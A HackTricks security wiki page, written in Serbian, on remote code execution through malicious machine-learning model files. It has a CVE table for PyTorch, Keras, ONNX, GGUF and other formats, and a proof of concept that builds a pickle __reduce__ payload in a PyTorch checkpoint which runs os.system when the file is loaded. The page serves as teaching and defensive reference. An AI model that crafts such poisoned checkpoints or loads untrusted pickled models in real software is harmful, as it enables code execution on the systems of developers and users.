# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Modeli mašinskog učenja se obično dele u različitim formatima, kao što su ONNX, TensorFlow, PyTorch, itd. Ovi modeli se mogu učitati na mašine programera ili proizvodne sisteme za korišćenje. Obično modeli ne bi trebali sadržati zlonamerni kod, ali postoje neki slučajevi gde se model može koristiti za izvršavanje proizvoljnog koda na sistemu kao nameravana funkcija ili zbog ranjivosti u biblioteci za učitavanje modela.

U vreme pisanja ovo su neki primeri ovog tipa ranjivosti:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Zlonameran pickle u model checkpoint-u dovodi do izvršavanja koda (obiđeno `weights_only` zaštita)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + zlonamerno preuzimanje modela uzrokuje izvršavanje koda; Java deserialization RCE u API-ju za upravljanje                        | |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Učitavanje modela iz YAML koristi `yaml.unsafe_load` (izvršavanje koda) <br> Učitavanje modela sa **Lambda** slojem pokreće proizvoljan Python kod          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Prilagođeni `.tflite` model izaziva prelivanje celog broja → oštećenje heap-a (potencijalni RCE)                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Učitavanje modela putem `joblib.load` izvršava pickle sa napadačevim `__reduce__` payload-om                                            | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` podrazumevano dozvoljava pickled objekte nizova – zlonameran `.npy/.npz` pokreće izvršavanje koda                          | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Spoljna putanja težina ONNX modela može pobjeći iz direktorijuma (čitati proizvoljne datoteke) <br> Zlonamerni ONNX model tar može prepisati proizvoljne datoteke (dovodeći do RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model sa prilagođenim operatorom zahteva učitavanje napadačeve nativne koda; složeni grafovi modela zloupotrebljavaju logiku za izvršavanje nepredviđenih proračuna   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Korišćenje API-ja za učitavanje modela sa `--model-control` omogućeno omogućava relativno pretraživanje putanja za pisanje datoteka (npr., prepisivanje `.bashrc` za RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Neispravan GGUF model fajl uzrokuje prelivanje bafera u parseru, omogućavajući proizvoljno izvršavanje koda na sistemu žrtve             | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Zlonameran HDF5 (`.h5`) model sa kodom Lambda sloja i dalje se izvršava prilikom učitavanja (Keras safe_mode ne pokriva stari format – “napad s degradacijom”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Mnogi ML alati (npr., pickle-bazirani formati modela, Python `pickle.load`) će izvršiti proizvoljni kod ugrađen u datoteke modela osim ako se ne ublaži | |

Pored toga, postoje neki modeli zasnovani na Python pickle-u, poput onih koje koristi [PyTorch](https://github.com/pytorch/pytorch/security), koji se mogu koristiti za izvršavanje proizvoljnog koda na sistemu ako se ne učitaju sa `weights_only=True`. Dakle, svaki model zasnovan na pickle-u može biti posebno podložan ovim vrstama napada, čak i ako nisu navedeni u tabeli iznad.

Primer:

- Kreirajte model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Učitaj model:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
{{#include ../banners/hacktricks-training.md}}
